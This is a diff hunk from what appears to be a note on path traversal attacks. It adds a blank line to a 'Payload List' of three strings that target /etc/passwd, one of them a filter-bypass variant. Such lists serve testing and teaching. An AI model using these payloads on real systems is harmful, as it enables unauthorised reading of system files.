@@ -10,6 +10,7 @@ Once an attacker successfully executes a Path Traversal attack, they can read, m
 
 
 # Payload List :
+
 ../../../etc/passwd
 /etc/passwd
 ....//....//....//etc/passwd
